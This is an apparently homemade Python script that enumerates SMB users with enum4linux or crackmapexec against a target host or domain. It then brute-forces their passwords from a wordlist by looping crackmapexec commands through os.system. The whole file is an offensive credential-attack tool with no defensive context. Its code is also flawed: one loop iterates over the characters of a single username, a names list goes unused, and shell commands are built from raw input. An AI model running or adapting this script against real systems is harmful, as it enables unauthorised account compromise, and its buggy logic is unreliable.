import os
import subprocess

names = []



def run_crackmap():
        keep = []
        burn = []

        crackmapexec = [
                "crackmapexec",
                "smb",
                domain,
                "-u",
                f"{first}.{last}",
                 "--users"
                ]
        completed_process = subprocess.run(crackmapexec, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = completed_process.stdout
        print(output)

        output_lines = output.split('\n')
        if output_lines:
                last_line = output_lines[-2]
        keep = last_line.strip().split("\\")
        keep = keep[-1]
        usernameL = keep.strip().split("  ")
        username = usernameL[0]

        print("user list: ", username)
        print()
        bruteforce = str(input("what file are you using for password brutforcing: "))
        print()
        print("finding user logins. . . ")

        for x in range(len(username)):
                brute = (f"crackmapexec smb {domain} -u {username[x]} -p {bruteforce} | grep +")
                os.system(brute)


def run_enum():
        keep = []
        burn = []
        enum4linux = [
        "enum4linux",
        f"{ip_addr}" 
        ]

        completed_process = subprocess.run(enum4linux, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = completed_process.stdout

        output_lines = output.split('\n')
        if output_lines:
                print('output generated')
        keep = [item for item in output_lines if "Local User" in item]
        keep = [item for item in keep if "nobody" not in item]

        user_list = []

        for i in range(len(keep)):
                user = keep[i]
                user = user.split('\\')
                user = user[-1]
                user = user.split(' (')
                user_list.append(user[0])
        username = set(user_list)
        username = list(username)

        print("user list: ", username)
        print()
        bruteforce = str(input("what file are you using for password brutforcing: "))
        print()
        print("finding user logins. . . ")

        for x in range(len(username)):
                brute = (f"crackmapexec smb {ip_addr} -u {username[x]} -p {bruteforce} | grep +")
                os.system(brute)

question = input("are you enumerating or using a premade file(e/p): ")


if question == 'p':
        domain = str(input("what domain are you finding users for: "))
        open_file = input("what file are you scanning: ")
        with open (open_file,'r') as file:
                for line in file:
                        first, last = line.strip().split(',')
                        names.append(first + last)
        run_crackmap()

elif question == 'e':
        ip_addr = str(input('what is the ip address of the target: '))
        print('running enum . . . ')
        run_enum()

else:
        print("error, invalid input")
